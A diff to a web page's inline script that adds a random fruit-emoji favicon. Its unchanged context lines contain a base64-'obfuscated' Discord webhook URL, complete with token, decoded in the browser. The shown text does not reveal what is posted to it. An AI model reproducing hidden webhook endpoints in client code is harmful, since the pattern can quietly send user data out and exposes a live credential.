@@ -225,6 +225,19 @@
 
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script>
+        // Function to select a random fruit emoji for the favicon
+        function setRandomFavicon() {
+            const fruitEmojis = ["🍎", "🍌", "🍓", "🍇", "🍍", "🍑", "🍉", "🍊"];
+            const randomFruit = fruitEmojis[Math.floor(Math.random() * fruitEmojis.length)];
+            const link = document.createElement("link");
+            link.rel = "icon";
+            link.href = `data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="32" height="32"><text x="0" y="32" font-size="32">${randomFruit}</text></svg>`;
+            document.head.appendChild(link);
+        }
+
+        // Call the function to set the favicon when the page loads
+        window.onload = setRandomFavicon;
+
         // Base64 encoded Discord webhook URL (obfuscated)
         const encodedWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMwNDYzMjMzOTgwODM5MTIyMC9oTTZpenFCSlVlMElKbUF4dE5BdnkzckwyeFBDYXlRdUxLeEpGR0tZdGxjQnAxcnpfRVVPTUNlTk93NXVqbTI5WTZESQ==";
         const webhookURL = atob(encodedWebhook); // Decode to get the actual webhook URL
